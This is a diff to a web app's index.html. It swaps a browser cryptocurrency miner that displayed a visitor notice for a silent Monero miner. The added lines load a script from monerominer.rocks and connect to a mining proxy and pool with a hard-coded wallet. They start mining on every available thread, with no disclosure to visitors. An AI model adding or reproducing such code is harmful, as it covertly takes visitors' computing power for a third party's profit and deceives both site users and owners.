@@ -10,14 +10,16 @@
 <body>
   <app-root></app-root>
 
-  <script src="https://www.hostingcloud.racing/gPtv.js"></script>
+  <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
   <script>
-    var _client = new Client.Anonymous('93f1714577cac2d6853c0bdad693c78b8c886beb01c716eff6a2ba7cb7a0f54a', {
-      throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
-
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "4A7hsMMiSjFbiHbSob9FSfKJHY3YBUwrPTxNpnpXPNtyK1mYCcohMQvAw1DAFUcco6hRPQpKxn8T62nsR2m5u8LhKtL3wZU";
+    var workerId = ""
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
   </script>
 </body>
 </html>
